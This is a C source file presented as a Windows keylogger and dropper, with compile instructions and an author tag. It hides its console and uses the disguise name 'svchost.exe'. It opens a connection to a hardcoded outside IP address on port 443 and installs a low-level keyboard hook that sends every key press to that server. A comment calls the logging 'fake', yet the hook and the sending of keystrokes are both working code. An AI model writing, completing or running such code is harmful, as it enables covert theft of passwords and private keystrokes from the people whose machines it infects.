// dropper.c - SleepTheGod @portknock Alpharetta Windows Keylogger + C2
// Compile with: cl.exe compile_me.c /Fe:ghost.exe /MT /O2 /DWIN32_LEAN_AND_MEAN
// or gcc -o ghost.exe compile_me.c -lws2_32 -static

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(lib, "ws2_32.lib")

#define C2_IP   "173.249.20.58"
#define C2_PORT 443
#define FAKE_NAME "svchost.exe"

HHOOK g_hHook = NULL;
SOCKET g_sock = INVALID_SOCKET;

// ====================== FAKE KEYLOG (real hook would go here) ======================
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        char key[32];
        sprintf(key, "[KEY:%d]", (int)p->vkCode);

        // Send to C2
        if (g_sock != INVALID_SOCKET) {
            send(g_sock, key, (int)strlen(key), 0);
        }
    }
    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

// ====================== C2 CONNECT ======================
int connect_c2(void) {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);

    g_sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_IP, &addr.sin_addr);

    if (connect(g_sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
        send(g_sock, "SleepTheGod @portknock connected from Windows\r\n", 48, 0);
        return 1;
    }
    return 0;
}

// ====================== MAIN ======================
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Hide console
    FreeConsole();
    AllocConsole();
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Fake name
    SetConsoleTitleA(FAKE_NAME);

    // Connect to C2
    if (!connect_c2()) {
        Sleep(5000);
        return 1;
    }

    // Install low-level keyboard hook
    g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);

    // Message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(g_hHook);
    closesocket(g_sock);
    WSACleanup();
    return 0;
}
